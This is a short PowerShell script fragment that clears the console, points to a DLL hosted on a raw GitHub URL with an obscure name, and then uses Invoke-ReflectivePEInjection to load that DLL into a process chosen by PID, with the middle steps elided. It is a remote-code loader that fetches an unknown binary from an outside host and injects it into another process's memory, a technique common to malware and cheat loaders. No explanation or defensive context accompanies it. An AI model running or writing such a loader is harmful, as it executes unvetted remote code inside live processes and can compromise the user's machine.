[Console]::Clear()
$dllUrl = "https://raw.githubusercontent.com/newgen319/xxx_x1/refs/heads/main/xxx_x1.dll"
...
Invoke-ReflectivePEInjection -PEBytes $dllBytes -ProcId (Read-Host "Enter PID")
